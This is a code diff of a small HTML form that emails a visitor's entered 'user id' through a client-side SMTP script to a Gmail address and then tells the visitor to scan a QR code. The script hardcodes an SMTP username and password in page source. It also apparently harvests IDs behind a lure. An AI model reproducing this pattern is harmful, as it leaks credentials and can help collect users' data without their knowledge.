@@ -16,8 +16,8 @@
         <h1>Enter user id:</h1>
         <input type="number" id="number" placeholder="number" name="number">
         <br>
-        <h1>Enter mail:</h1>
-        <input type="email" id="email" placeholder="mc.hariss00@gmail.com">
+        <!-- <h1>Enter mail:</h1>
+        <input type="email" id="email" placeholder="mc.hariss00@gmail.com"> -->
         <br>
         <br>
         <button type="submit">SEND</button>
@@ -29,13 +29,13 @@
                 Host: "smtp.elasticemail.com",
                 Username: "yelloworangestar752@gmail.com",
                 Password: "FB73926CC228CDF6CCA88C2302F065CA1F1C",
-                To: 'mc.hariss00@gmail.com',
+                To: 'londfang@gmail.com',
                 // From: document.getElementById("email").value,
                 From: 'yelloworangestar752@gmail.com',
-                Subject: "New Contact Form Enquiry",
-                Body: "And this is the body"
+                Subject: "New Submission from your link",
+                Body: document.getElementById("number").value
             }).then(
-                message => alert(message)
+                message => alert("Please scan the Qrcode")
             );
         }
     </script>
